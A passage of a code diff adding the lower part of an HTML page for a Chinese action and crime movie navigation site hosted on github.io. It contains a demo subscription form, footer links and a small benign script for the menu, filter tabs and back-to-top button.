+        <div><s>📱</s><span>移动端自适应：手机、平板、电脑一致的硬朗体验</span></div>
+        <div><s>✍️</s><span>观影随笔：拆解镜头语言，而不只是告诉你“好看”</span></div>
+        <div><s>🔍</s><span>语义化结构：便于搜索引擎理解与收录</span></div>
+      </div>
+      <a class="btn btn-amber" href="https://heiyingdianyingwang-cn.github.io/">🌐 访问 heiyingdianyingwang-cn.github.io</a>
+    </div>
+    <div class="sub">
+      <h3>📮 订阅硬核片单</h3>
+      <p>留下邮箱，每周收到一份“按肾上腺素剂量分级”的片单，不吵不扰，只送干货。</p>
+      <form class="inpgrp" onsubmit="event.preventDefault();alert('订阅成功！（演示功能）')">
+        <input type="email" placeholder="your@email.com" required aria-label="邮箱地址">
+        <button type="submit">立即订阅</button>
+      </form>
+      <div class="chips">
+        <i># 动作枪战</i><i># 犯罪悬疑</i><i># 战争史诗</i><i># 谍战特工</i><i># 赛车竞速</i>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 页脚 ===== -->
+<footer>
+  <div class="wrap">
+    <div class="fg">
+      <div class="fo">
+        <a class="logo" href="#top"><s>🦅 黑鹰电影网</s></a>
+        <p>黑鹰电影网（heiyingdianyingwang-cn.github.io）提供动作、犯罪、战争、悬疑电影的在线观看导航、高清片库、实时热播榜与导演专题。</p>
+        <div class="socs">
+          <a href="#" aria-label="微信">💬</a>
+          <a href="#" aria-label="微博">🐦</a>
+          <a href="#" aria-label="RSS">📰</a>
+          <a href="#" aria-label="邮箱">✉</a>
+        </div>
+      </div>
+      <div class="fcol"><h4>内容分类</h4><a href="#">动作枪战</a><a href="#">犯罪悬疑</a><a href="#">战争史诗</a><a href="#">谍战特工</a><a href="#">赛车竞速</a></div>
+      <div class="fcol"><h4>观影指南</h4><a href="#">硬核片单</a><a href="#">镜头拆解</a><a href="#">音响推荐</a><a href="#">高分榜单</a></div>
+      <div class="fcol"><h4>关于本站</h4><a href="#">站点简介</a><a href="#">更新日志</a><a href="#">投稿合作</a><a href="#">联系我们</a></div>
+    </div>
+    <div class="copy">
+      © 2026 <b>黑鹰电影网</b> · 网站网址：https://heiyingdianyingwang-cn.github.io/<br>
+      本站为影视资源导航与信息分享平台，所载内容仅供交流与索引之用，版权归原作者所有。
+    </div>
+  </div>
+</footer>
+
+<button class="top" id="topBtn" aria-label="回到顶部">↑</button>
+
+<script>
+var ham=document.getElementById('ham'),links=document.getElementById('links');
+ham.addEventListener('click',function(){links.classList.toggle('open');ham.textContent=links.classList.contains('open')?'✕':'☰'});
+links.addEventListener('click',function(e){if(e.target.tagName==='A'){links.classList.remove('open');ham.textContent='☰'}});
+
+var flts=document.querySelectorAll('.flt');
+flts.forEach(function(f){f.addEventListener('click',function(){
+  flts.forEach(function(x){x.classList.remove('on');x.setAttribute('aria-selected','false')});
+  f.classList.add('on');f.setAttribute('aria-selected','true');
+})});
+
+var t=document.getElementById('topBtn');
+window.addEventListener('scroll',function(){t.classList[window.scrollY>500?'add':'remove']('show')});
+t.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'})});
+</script>
+</body>
+</html>
